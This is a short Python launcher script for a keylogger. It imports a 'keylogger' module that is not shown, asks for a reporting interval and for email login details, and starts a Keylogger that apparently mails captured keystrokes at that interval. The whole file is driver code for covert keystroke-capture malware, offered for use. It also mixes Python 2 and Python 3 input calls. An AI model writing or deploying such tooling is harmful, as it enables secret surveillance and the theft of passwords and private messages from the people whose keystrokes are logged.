#!/usr/bin/env python

import keylogger
import getpass

time = int(input("Enter Time interval(in sec) for getting emails:"))
email = raw_input("Email:")
password = getpass.getpass(prompt='Password:', stream=None)
start_keylogger = keylogger.Keylogger(time, email, password)  # time interval in seconds
start_keylogger.start()
